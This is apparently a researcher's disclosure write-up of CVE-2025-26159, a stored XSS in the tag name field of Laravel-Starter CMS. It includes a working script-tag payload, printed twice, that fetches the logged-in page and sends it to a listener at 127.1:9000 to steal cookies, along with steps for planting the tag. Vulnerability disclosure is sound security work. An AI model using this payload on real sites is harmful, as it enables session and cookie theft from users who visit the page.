**Discovered by: Fernando Gonz√°lez Perea**

CVE-2025-26159 is a Stored Cross-Site Scripting (XSS) vulnerability in the [Laravel-Starter CMS](https://github.com/nasirkhan/laravel-starter), specifically within the tag name field. This vulnerability allows an attacker to inject and execute malicious JavaScript code in the browsers of users who visit the affected tag details page.

The issue impacts versions prior to v11.11.0 and arises due to improper sanitization of user input, which is stored on the server without adequate validation.

An attacker can take advantage of this vulnerability to steal cookies in the server by creating a a tag with the following payload in the name field.

```js
<script>fetch("/",{credentials:"include"}).then(r=>r.text()).then(d=>location='//127.1:9000/d='+escape(d))</script>
```
# Proof of Concept

To abuse this vulnerability we will just need control over an user with the following permissions.

![Pic]({{ '/assets/img/cve-2025-laravel/role_user.png' | relative_url }}){: .center-image }

Now let's create the malicious tag. With the user account, we can go to Admin Dashboard > Tags

![Pic]({{ '/assets/img/cve-2025-laravel/admin_dashboard.png' | relative_url }}){: .center-image }

![Pic]({{ '/assets/img/cve-2025-laravel/tag_menu.png' | relative_url }}){: .center-image }

Now, we can inject the malicious payload into the "name" field, also remember to add random data to the next fields.

```javascript
<script>fetch("/",{credentials:"include"}).then(r=>r.text()).then(d=>location='//127.1:9000/d='+escape(d))</script>
```

![Pic]({{ '/assets/img/cve-2025-laravel/malicious_tag.png' | relative_url }}){: .center-image }

Once the tag has been created, any user who visits the detailed page will execute the JavaScript code in his browser, but to get his cookies, we need to create a HTTP server, get the content of the web, decode it from url encode and search for the cookies. To make it easier, I have write this [script](https://github.com/godBADTRY/CVE-2025-26159) in Go that make all this.

![Pic]({{ '/assets/img/cve-2025-laravel/run_script.png' | relative_url }}){: .center-image }

And lastly, when the user clicks on "View details" bottom, we will get his cookies.

![Pic]({{ '/assets/img/cve-2025-laravel/tag_created.png' | relative_url }}){: .center-image }

![Pic]({{ '/assets/img/cve-2025-laravel/COOKIES.png' | relative_url }}){: .center-image }
